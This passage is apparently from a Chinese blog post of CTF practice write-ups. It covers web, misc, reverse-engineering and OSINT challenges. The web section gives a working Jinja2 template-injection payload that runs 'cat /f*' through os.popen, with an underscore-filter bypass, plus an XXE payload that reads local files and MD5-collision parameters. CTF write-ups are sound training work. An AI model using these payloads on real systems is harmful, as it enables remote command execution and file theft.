+<p><font style="color:black;background-color:#bbbfc4;">attr(“<strong>globals</strong>“)</font>：从<font style="color:black;background-color:#bbbfc4;">lipsum</font>对象中获取<font style="color:black;background-color:#bbbfc4;">globals</font>属性。</p>
+<p><font style="color:black;background-color:#fff67a;">这里的管道符</font><font style="color:black;background-color:#fff67a;">|</font><font style="color:black;background-color:#fff67a;">把</font><font style="color:black;background-color:#fff67a;">lipsum</font><font style="color:black;background-color:#fff67a;">对象传递给</font><font style="color:black;background-color:#fff67a;">attr(“<strong>globals</strong>“)</font><font style="color:black;background-color:#fff67a;">过滤器进行处理，然后返回全局命名空间对象</font>。</p>
+<p>**4. ****<font style="color:black;background-color:#bbbfc4;">attr(“<strong>getitem</strong>“)(“os”)</font>**</p>
+<p><font style="color:black;background-color:#bbbfc4;">jinja2</font></p>
+<pre><code class="language-python">lipsum|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;cat /f*&quot;)
+</code></pre>
+<p><font style="color:#3370ff;">•</font><font style="color:#3370ff;">          </font><font style="color:black;background-color:#bbbfc4;">getitem</font>是 Python 中的一个魔术方法，用于实现对象的索引操作。在这个上下文中，<font style="color:black;background-color:#bbbfc4;">attr(“<strong>getitem</strong>“)</font>是获取全局命名空间对象的<font style="color:black;background-color:#bbbfc4;">getitem</font>方法。</p>
+<p><font style="color:#3370ff;">•</font><font style="color:#3370ff;">          </font><font style="color:black;background-color:#bbbfc4;">attr(“<strong>getitem</strong>“)</font>：从全局命名空间对象中获取<font style="color:black;background-color:#bbbfc4;">getitem</font>方法。</p>
+<p><font style="color:#3370ff;">•</font><font style="color:#3370ff;">          </font><font style="color:black;background-color:#bbbfc4;">(“os”)</font>是调用这个<font style="color:black;background-color:#bbbfc4;">getitem</font>方法，并传入参数<font style="color:black;background-color:#bbbfc4;">“os”</font>，目的是从全局命名空间中获取<font style="color:black;background-color:#bbbfc4;">os</font>模块对象。</p>
+<p><font style="color:black;background-color:#fff67a;">此处的管道符</font><font style="color:black;background-color:#fff67a;">|</font><font style="color:black;background-color:#fff67a;">把全局命名空间对象传递给</font><font style="color:black;background-color:#fff67a;">attr(“<strong>getitem</strong>“)</font><font style="color:black;background-color:#fff67a;">过滤器，进而获取</font><font style="color:black;background-color:#fff67a;">os</font><font style="color:black;background-color:#fff67a;">模块对象。</font></p>
+<p>**5. ****<font style="color:black;background-color:#bbbfc4;">attr(“popen”)(“cat &#x2F;f*”)</font>**</p>
+<p><font style="color:black;background-color:#bbbfc4;">jinja2</font></p>
+<pre><code class="language-python">lipsum|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;cat /f*&quot;)|attr(&quot;read&quot;)()
+</code></pre>
+<p><font style="color:#3370ff;">•</font><font style="color:#3370ff;">          </font><font style="color:black;background-color:#bbbfc4;">attr(“popen”)</font>是获取<font style="color:black;background-color:#bbbfc4;">os</font>模块对象的<font style="color:black;background-color:#bbbfc4;">popen</font>方法。<font style="color:black;background-color:#bbbfc4;">os.popen</font>是 Python 中用于执行系统命令的函数，它会返回一个文件对象，通过该对象可以读取命令的输出。</p>
+<p><font style="color:#3370ff;">•</font><font style="color:#3370ff;">          </font><font style="color:black;background-color:#bbbfc4;">(“cat &#x2F;f*”)</font>是调用<font style="color:black;background-color:#bbbfc4;">popen</font>方法并传入系统命令<font style="color:black;background-color:#bbbfc4;">cat &#x2F;f*</font>，从而执行该命令。</p>
+<p><font style="color:black;background-color:#fff67a;">这里的管道符</font><font style="color:black;background-color:#fff67a;">|</font><font style="color:black;background-color:#fff67a;">把</font><font style="color:black;background-color:#fff67a;">os</font><font style="color:black;background-color:#fff67a;">模块对象传递给</font><font style="color:black;background-color:#fff67a;">attr(“popen”)</font><font style="color:black;background-color:#fff67a;">过滤器，然后执行系统命令。</font></p>
+<p>**6. ****<font style="color:black;background-color:#eff0f1;">attr(“read”)()</font>**</p>
+<p>jinja2</p>
+<pre><code class="language-python">lipsum|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;cat /f*&quot;)|attr(&quot;read&quot;)()
+</code></pre>
+<p><font style="color:#3370ff;">•</font><font style="color:#3370ff;">          </font><font style="color:black;background-color:#bbbfc4;">attr(“read”)</font>是获取<font style="color:black;background-color:#bbbfc4;">popen</font>方法返回的文件对象的<font style="color:black;background-color:#bbbfc4;">read</font>方法。</p>
+<p><font style="color:#3370ff;">•</font><font style="color:#3370ff;">          </font><font style="color:black;background-color:#bbbfc4;">()</font>是调用<font style="color:black;background-color:#bbbfc4;">read</font>方法，将命令执行的输出内容读取出来。</p>
+<p><font style="color:black;background-color:#fff67a;">此处的管道符</font><font style="color:black;background-color:#fff67a;">|</font><font style="color:black;background-color:#fff67a;">把文件对象传递给</font><font style="color:black;background-color:#fff67a;">attr(“read”)</font><font style="color:black;background-color:#fff67a;">过滤器，进而读取命令输出。</font></p>
+<p>**7. ****<font style="color:black;background-color:#bbbfc4;">print</font>**<strong>函数</strong></p>
+<p><font style="color:black;background-color:#bbbfc4;">jinja2</font></p>
+<pre><code class="language-python">&#123;%print(lipsum|attr("__globals__")|attr("__getitem__")("os")|attr("popen")("cat /f*")|attr("read")())%&#125;
+</code></pre>
+<p><font style="color:black;background-color:#bbbfc4;">print</font>是 Jinja2 中的一个函数，用于将表达式的结果输出到页面上。所以，最终会将执行<font style="color:black;background-color:#bbbfc4;">cat &#x2F;f*</font>命令的输出结果显示在页面上。</p>
+<p>最后因为下划线被过滤了所以需要进行<font style="color:#8f959e;background-color:#bbbfc4;">Unicode</font><font style="color:#8f959e;background-color:#bbbfc4;">编码</font></p>
+<pre><code class="language-python">class_name = &quot;填入字符串&quot;
+
+unicode_class_name = &#39;&#39;.join([&#39;\\u&#123;:04x&#125;&#39;.format(ord(char)) for char in class_name])
+
+print(unicode_class_name)
+</code></pre>
+<p><img src="1742215524884-83152f36-50e9-490a-a149-f37f7fdd902d.png" loading="lazy"></p>
+<hr>
+<h2 id="readfile-1"><a href="#readfile-1" class="headerlink" title="readfile"></a>readfile</h2><p><img src="1742213856538-c2554eb0-0e85-4051-bfb5-405ad3d27ccb.png" loading="lazy"></p>
+<p>3</p>
+<pre><code class="language-php">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
+</code></pre>
+<p><img src="1742213856714-df557a52-c122-46c7-b766-97454aace05f.png" loading="lazy"></p>
+<p><img src="1742213856881-7ce3dfdf-030e-4555-ac87-fff799449f05.png" loading="lazy"></p>
+<h2 id="xxx"><a href="#xxx" class="headerlink" title="(&gt;!xxx!&lt;)"></a>(&gt;!xxx!&lt;)</h2><p><img src="1742432622314-51237bc8-539d-4601-8f3c-d70eb103beeb.png" loading="lazy"></p>
+<p>首先拿到题目发现flask,xml,大概就知道这是一道XXE漏洞，XXE漏洞就是XML外部实体注入。</p>
+<p>首先我们直接抓包</p>
+<p><img src="1742432622742-3837972d-40e5-4c01-be0e-da97b0a5fd3c.png" loading="lazy"></p>
+<p>观察得出有两个路由，一看就知道用的是203ctf路由，然后有题目得知用post传参</p>
+<p><img src="1742432622542-ee43df7c-9244-4ae0-af4b-2665650fbe91.png" loading="lazy"></p>
+<p><img src="1742432622430-d405715b-5ee2-4ada-9d47-07546b591bd3.png" loading="lazy"></p>
+<p>直接使用xxeXXE 的产生正是外部实体引用的结果，可分为普通实体和参数实体。</p>
+<p>这里使用普通实体声明，格式如下</p>
+<p><img src="1742432622326-ce366b3d-f1eb-44d3-bd78-d2e970a7c83c.png" loading="lazy"></p>
+<p><font style="color:black;background-color:#eff0f1;"><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///ffffffffffffffffff1111111111111111111114444444444444499999999999999'>]&gt;<root><name>&xxe;</name></root></font></p>
+<p><font style="color:black;background-color:#eff0f1;"><!DOCTYPE root [</font><font style="color:#2ea121;background-color:#bbbfc4;"><br></font><font style="color:black;background-color:#eff0f1;">    </font><font style="color:black;background-color:#eff0f1;"><!ENTITY xxe SYSTEM "file:///flag"></font><font style="color:#2ea121;background-color:#bbbfc4;"><br></font><font style="color:black;background-color:#eff0f1;">]&gt;</font><font style="color:#2ea121;background-color:#bbbfc4;"><br></font><font style="color:black;background-color:#eff0f1;"><root></root></font><font style="color:#2ea121;background-color:#bbbfc4;"><br></font><font style="color:black;background-color:#eff0f1;">    </font><font style="color:black;background-color:#eff0f1;"><name>&xxe;</name></font><font style="color:#2ea121;background-color:#bbbfc4;"><br></font><font style="color:black;background-color:#eff0f1;"></font></font></p>
+<p>因为使用的是post传参，所以要进行url编码</p>
+<p><img src="1742432622652-686473ec-518e-4206-80d2-56da9e60f476.png" loading="lazy"></p>
+<p><img src="1742432622949-fa6397bc-3b96-4203-9298-a04ae5752b14.png" loading="lazy"></p>
+<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="《声音迷宫》"><a href="#《声音迷宫》" class="headerlink" title="《声音迷宫》"></a>《声音迷宫》</h2><p>1.打开题目下载附件，得到一段wav音频文件，尝试听取音频内容，感到非常奇怪。</p>
+<p><img src="1742218143835-307c11be-910d-413f-a098-a565750bf302.png" loading="lazy"></p>
+<p>2.将音频慢放后感觉音频疑似倒放。</p>
+<p>3.使用在线工具将此段音频倒放，得到flag。</p>
+<p>在线工具：<a target="_blank" rel="noopener" href="https://audiotrimmer.com/cn/online-mp3-reverser/">https://audiotrimmer.com/cn/online-mp3-reverser/</a></p>
+<p>flag{reverse_audio}</p>
+<h2 id="盗梦空间"><a href="#盗梦空间" class="headerlink" title="盗梦空间"></a>盗梦空间</h2><p><img src="1742216259988-3289932e-31a1-433b-84bf-f96ec08b3afb.png" loading="lazy"></p>
+<p>将图片拖入随波逐流发现有隐藏文件</p>
+<p><img src="1742216257996-a6b7c04b-bebf-42c3-81c1-a5c6e782aafa.png" loading="lazy"></p>
+<p>试着Binwalk文件提取，提取失败，改用foremost提取</p>
+<p><img src="1742216257899-6a554337-ed1b-4fe9-a09e-19b8596bd410.png" loading="lazy"></p>
+<p>得到了一个相似图片</p>
+<p><img src="1742216262574-5ad751d3-5474-4e77-bd6f-ac2d2a74c8a6.png" loading="lazy"></p>
+<p>题目提示要进行比较，用Beyond Compare比较图片，只比较图片未找到有用信息</p>
+<p>试着比较两张图片的十六进制，在左半部分红色区域找到了flag</p>
+<p><img src="1742216258466-ac512520-092c-4f18-b39c-88486bfeaf66.png" loading="lazy"></p>
+<h2 id="《小黑子露出鸡脚了吧》"><a href="#《小黑子露出鸡脚了吧》" class="headerlink" title="《小黑子露出鸡脚了吧》"></a>《小黑子露出鸡脚了吧》</h2><p>首先下载附件</p>
+<p><img src="1742216167911-6d2414ee-bb40-4422-bb53-0fab767fc5b4.png" loading="lazy"></p>
+<p><img src="1742216168583-36629c57-bd42-484e-839b-1e31e5be821f.png" loading="lazy"></p>
+<p>直接将该附件丢到随波逐流</p>
+<p><img src="1742216168217-27361280-7ef0-463e-8d90-1a2f9da41d62.png" loading="lazy"></p>
+<p>使用Binwalk文件提取</p>
+<p><img src="1742216168882-5537668e-1ca9-4cf1-a04f-1410787d94f2.png" loading="lazy"></p>
+<p><img src="1742216168501-1154afea-3fa8-4eda-a024-d1c226a382ae.png" loading="lazy"></p>
+<p>成功提取出_坤哥.docx.extracted文件</p>
+<p><img src="1742216168682-2e311c92-c516-44fd-99cb-a7d9e7d34b2c.png" loading="lazy"></p>
+<p><img src="1742216168712-d5fe30ad-79c4-4e09-af5b-40824a054969.png" loading="lazy"></p>
+<p>将文件中的图片再次拖入随波逐流</p>
+<p><img src="1742216169019-9ea5e128-3975-4559-915e-fe0a5fe848fa.png" loading="lazy"></p>
+<p>再次提取文件</p>
+<p><img src="1742216169114-b604d976-9f81-40af-a7a7-c9158a22ce25.png" loading="lazy"></p>
+<p><img src="1742216169010-a0c97218-70c2-423d-8779-cfcb68b18962.png" loading="lazy"></p>
+<p>然后就是找密码</p>
+<p>开始试了把文件丢进010，但是没有发现什么，然后直接把体图片托在谷歌里面，</p>
+<p><img src="1742216169934-3515d179-41db-4a7c-a175-0686c5deae4a.png" loading="lazy"></p>
+<p><img src="1742216169343-72c8c091-6a65-41b8-a677-a4742f7659c7.png" loading="lazy"></p>
+<p>解码</p>
+<p><img src="1742216169651-4a8e7cc3-1fd7-4487-aa4e-5face3984f32.png" loading="lazy"></p>
+<p>试了一下一个显示出来password为ikunikun</p>
+<p>也就是前面压缩包的密码</p>
+<h2 id="聪明人"><a href="#聪明人" class="headerlink" title="聪明人"></a>聪明人</h2><p>下载附件很明显的特点应该是零宽字符</p>
+<p><img src="1742215632828-13d0bcfd-3cfc-4ea6-b3d0-4bff36539aba.png" loading="lazy"></p>
+<p>网站：<a target="_blank" rel="noopener" href="http://330k.github.io/misc_tools/unicode_steganography.js">http://330k.github.io/misc_tools/unicode_steganography.js</a></p>
+<p><img src="1742215633081-35de9eea-2cb9-4c27-a7a5-1a5764f5b3fc.png" loading="lazy"></p>
+<p>解码后发现base64的编码</p>
+<p>所以放入工具解码得到flag</p>
+<p><img src="1742215633167-73e53de2-00ce-4368-a13f-573307f1663c.png" loading="lazy"></p>
+<h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="xxtea"><a href="#xxtea" class="headerlink" title="xxtea"></a>xxtea</h2><p>拿到附件放die里</p>
+<p><img src="1742216527574-c99f6391-8fc2-4b98-bae1-81af1ad1dea5.png" loading="lazy"></p>
+<p>IDA打开</p>
+<p><img src="1742216527491-5761d125-2d2b-4218-895a-d77159c5d945.png" loading="lazy"></p>
+<p>直接解密</p>
+<pre><code class="language-cpp">#include &lt;stdio.h&gt;
+#include &lt;stdint.h&gt;
+#define DELTA 0x9e3779b9
+#define MX (((z&gt;&gt;5^y&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))
+
+void btea(uint32_t *v, int n, uint32_t const key[4])
+&#123;
+    uint32_t y, z, sum;
+    unsigned p, rounds, e;
+    //加密
+    if (n &gt; 1)
+    &#123;
+        rounds = 6 + 52 / n;
+        sum = 0;
+        z = v[n - 1];
+        do
+            &#123;
+                sum += DELTA;
+                e = (sum &gt;&gt; 2) &amp; 3;
+                for (p = 0; p&lt;n - 1; p++)
+                    &#123;
+                        y = v[p + 1];
+                        z = v[p] += MX;
+                    &#125;
+                y = v[0];
+                z = v[n - 1] += MX;
+            &#125; while (--rounds);
+    &#125;
+        //解密
+    else if (n &lt; -1)
+    &#123;
+        n = -n;
+        rounds = 6 + 52 / n;
+        sum = rounds*DELTA;
+        y = v[0];
+        do
+            &#123;
+                e = (sum &gt;&gt; 2) &amp; 3;
+                for (p = n - 1; p&gt;0; p--)
+                    &#123;
+                        z = v[p - 1];
+                        y = v[p] -= MX;
+                    &#125;
+                z = v[n - 1];
+                y = v[0] -= MX;
+                sum -= DELTA;
+            &#125; while (--rounds);
+    &#125;
+&#125;
+
+int main()
+&#123;
+    /*
+    原数据为：               传进去的参数为：
+    0xbc 0xa5 0xce 0x40     -&gt;0x40cea5bc
+    0xf4 0xb2 0xb2 0xe7     -&gt;0xe7b2b2f4
+    0xa9 0x12 0x9d 0x12     -&gt;0x129d12a9
+    0xae 0x10 0xc8 0x5b     -&gt;0x5bc810ae
+    0x3d 0xd7 0x06 0x1d     -&gt;0x1d06d73d
+    0xdc 0x70 0xf8 0xdc     -&gt;0xdcf870dc
+    */
+    uint32_t v[6] = &#123;
+    (unsigned int)0x40CEA5BC, (unsigned int)0xe7b2b2f4,
+    (unsigned int)0x129d12a9,(unsigned int)0x5bc810ae,
+    (unsigned int)0x1d06d73d,(unsigned int)0xdcf870dc &#125;;
+
+    /*
+    密钥为字符串&quot;flag&quot;
+    十六进制表示为 0x66 0x6c 0x61 0x67
+    于是传进去的参数要转换成 0x67616c66
+    由于密钥长度为128位，其余需填充0
+    */
+    uint32_t const k[4] = &#123;
+    (unsigned int)0x67616C66, (unsigned int)0x0,
+    (unsigned int)0X0, (unsigned int)0x0 &#125;;
+
+    //n的绝对值表示v的长度，取正表示加密，取负表示解密
+    int n = sizeof(v) / sizeof(uint32_t);
+
+
+    btea(v, -n, k);
+
+    char flag[25]=&#123;0&#125;;
+    for (int i = 0; i &lt; n; i++)
+        &#123;
+            for (int j = 0; j &lt; sizeof(uint32_t) / sizeof(uint8_t); j++)
+                &#123;
+                    flag[i*4+j]=(v[i] &gt;&gt; (j * 8)) &amp; 0xFF;
+                &#125;
+        &#125;
+    printf(&quot;%s\n&quot;,flag);
+    printf(&quot;\n&quot;);
+    return 0;
+&#125;
+</code></pre>
+<p>输出结果为flag{CXX_and_++tea}</p>
+<h2 id="常规脱壳"><a href="#常规脱壳" class="headerlink" title="常规脱壳"></a>常规脱壳</h2><p>拿到附件放die里，进行查壳</p>
+<p><img src="1742216450602-52b463c8-6f96-482a-a23f-a48960da8db8.png" loading="lazy"></p>
+<p>发现是有upx壳的，先按常规的upx.exe -d 进行解包</p>
+<p><img src="1742216450529-e6a04f45-5e90-4ea1-b2c6-f07d33605cc7.png" loading="lazy">发现解不了包，应该是魔改后的upx壳，拿010工具进行修改参数</p>
+<p><img src="1742216450787-67b37d63-f032-41c9-a237-17a911b43772.png" loading="lazy"></p>
+<p>修改完成后在执行upx.exe -d </p>
+<p><img src="1742216450671-a79badd5-87d1-4713-bc27-fde9d3dd5881.png" loading="lazy"></p>
+<p>解包成功</p>
+<p>在拿IDA64打开，shift+f12没有重要信息，看主函数</p>
+<p><img src="1742216450742-15dd276e-2a1c-4d63-ad61-c2ecfaa1ff1a.png" loading="lazy"></p>
+<p>然后就是编写脚本，选中v4[0]就可以shift+e转十六进制</p>
+<p><img src="1742216450761-05e5c53c-b14f-4056-b16c-58d94301a170.png" loading="lazy"></p>
+<p>LitCTF{w3lc0me_t0_l1tctf}</p>
+<h1 id="OSINT"><a href="#OSINT" class="headerlink" title="OSINT"></a>OSINT</h1><h2 id="《Instagram地理猎人》"><a href="#《Instagram地理猎人》" class="headerlink" title="《Instagram地理猎人》"></a><strong>《Instagram地理猎人》</strong></h2><p>首先观察图片，上面的牌子应该就是店名，复制店名</p>
+<p><img src="1742217612034-c65adedc-524a-42ad-bb49-5efa3ea89af3.png" loading="lazy"></p>
+<p>在谷歌上去搜索，找到了这家店</p>
+<p><img src="1742217612633-62d2e390-e3c7-43b8-a6a8-685be3a6b7e8.png" loading="lazy"></p>
+<p>刚好找到百分之60的热可可</p>
+<p><img src="1742217612161-eb759c11-9a4c-4116-b9af-19ed18ab5b4a.png" loading="lazy"></p>
+<p>将900kr转换为人名币</p>
+<p><img src="1742217611782-a8b86d89-2f24-458d-a6df-e12511a0d3b7.png" loading="lazy"></p>
+</div></section><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>ZeroTrace, All</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="http://example.com/article/2025/03/2025.3.15-practice-wp.html/" title="203周末练习赛25/3/15">http://example.com/article/2025/03/2025.3.15-practice-wp.html/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> 许可协议。</li></ul></article><div class="post-nav"><div class="post-nav-item"></div><div class="post-nav-item"><a class="post-nav-next" href="/article/2025/03/2025GHCTF-wp.html/" rel="next" title="2025GHCTF新生赛(悄悄塞国际题)"><span class="post-nav-text">2025GHCTF新生赛(悄悄塞国际题)</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2024 – 2025 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> John Doe</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v7.3.0</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div><div class="live-time"><span>感谢陪伴</span><span id="display_live_time"></span><span class="moe-text">(●'◡'●)</span><script>function blog_live_time() {
+  setTimeout(blog_live_time, 1000);
+  const start = new Date('2025-03-20T00:00:00');
+  const now = new Date();
+  const timeDiff = (now.getTime() - start.getTime());
+  const msPerMinute = 60 * 1000;
+  const msPerHour = 60 * msPerMinute;
+  const msPerDay = 24 * msPerHour;
+  const passDay = Math.floor(timeDiff / msPerDay);
+  const passHour = Math.floor((timeDiff % msPerDay) / 60 / 60 / 1000);
+  const passMinute = Math.floor((timeDiff % msPerHour) / 60 / 1000);
+  const passSecond = Math.floor((timeDiff % msPerMinute) / 1000);
+  display_live_time.innerHTML = ` ${passDay} 天 ${passHour} 小时 ${passMinute} 分 ${passSecond} 秒`;
+}
+blog_live_time();
+</script></div><div class="footer-custom-text">YourText <a href="yourLink" rel="noopener" target="_blank">Description</a></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><script src="https://fastly.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script><script>const images = [...document.querySelectorAll('.markdown-body img')]
+mediumZoom(images)</script><style>.medium-zoom-image {
+  z-index: 99;
+}</style></body></html>
